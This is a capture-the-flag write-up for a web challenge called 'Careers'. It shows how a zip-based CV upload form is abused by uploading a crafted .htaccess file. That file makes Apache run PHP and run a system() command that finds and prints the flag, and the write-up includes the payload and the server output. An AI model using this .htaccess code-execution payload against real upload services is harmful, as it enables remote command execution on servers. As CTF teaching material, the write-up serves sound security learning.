# Careers
* Category: Web
* 100 Points
* Solved by the JCTF Team

## Description

> We got hacked,
> 
> We're trying to indentify the ROOT cause.
> 
> If you are a l33t h4x0r, please upload your resume.


## Solution

The attached website allows uploading CVs:

```html
<div class="bg-dark text-secondary px-4 py-5 text-center">
    <div class="py-5">
      <h1 class="display-5 fw-bold text-white">Careers, CV Upload Page</h1>
      <div class="col-lg-6 mx-auto">
        <p class="fs-5 mb-4">Upload your CV using txt format only, please archive the files using zip format.</p>
        <form method="post" enctype="multipart/form-data"> 
		<input type="file" name="zip_file" />
		<br /> <br /> 
		<input type="submit" name="btn_zip" class="btn btn-info" value="Upload" />  
      </div>
    </div>
	<p>
			</p>
  </div>
```

All we need to do is zip our CV and upload it:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ echo "This is a test." > test.txt

┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ zip test.zip test.txt
  adding: test.txt (stored 0%)
```

Once we do, we get the following message:

```html
<p class="fs-5 mb-4">Thank you!, our recruiter will contact you ASAP, your candinate ID is: 37a0e2f4f4999c7aaadfe6b3009354f7,
			<br><a href="./upload/37a0e2f4f4999c7aaadfe6b3009354f7" class="link-success">37a0e2f4f4999c7aaadfe6b3009354f7 Files</a></p>
```

We can visit that link and see that our CV was extracted there:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ curl -k 'https://careers.chal.intentsummit.org/upload/37a0e2f4f4999c7aaadfe6b3009354f7/test.txt' -H 'Cookie: intent-ctf-session=6788422a5e4230e038bd5673cc4708aa'
This is a test.
```

This is a PHP site, so we should start by trying to upload a PHP file. 

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ cat phpinfo.php
<?php
phpinfo();
?>

┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ zip php.zip phpinfo.php test.txt
updating: phpinfo.php (stored 0%)
  adding: test.txt (stored 0%)
```

However, those don't seem to get extracted to the upload directory.

The next best thing would be an `.htaccess` file that executes PHP:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ cat .htaccess
<Files .htaccess>
    ForceType application/x-httpd-php
    SetHandler application/x-httpd-php
    Require all granted
    Order allow,deny
    Allow from all
    php_flag engine on
</Files>
php_value auto_prepend_file .htaccess
#<?php echo system("cat $(find / -name flag)")."<br />"; ?>

┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ zip htaccess.zip .htaccess test.txt
  adding: .htaccess (deflated 32%)
  adding: test.txt (stored 0%)
```

Once uploaded, we get:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Careers]
└─$ curl -k 'https://careers.chal.intentsummit.org/upload/7781187f9f7f6de411a91c2396f15859/.htaccess' -H 'Cookie: intent-ctf-session=6788422a5e4230e038bd5673cc4708aa'
<Files .htaccess>
    ForceType application/x-httpd-php
    SetHandler application/x-httpd-php
    Require all granted
    Order allow,deny
    Allow from all
    php_flag engine on
</Files>
php_value auto_prepend_file .htaccess
#a
INTENT{zipfiles_are_awsome_for_pt}INTENT{zipfiles_are_awsome_for_pt}<br />
<Files .htaccess>
    ForceType application/x-httpd-php
    SetHandler application/x-httpd-php
    Require all granted
    Order allow,deny
    Allow from all
    php_flag engine on
</Files>
php_value auto_prepend_file .htaccess
#a
INTENT{zipfiles_are_awsome_for_pt}INTENT{zipfiles_are_awsome_for_pt}<br />
```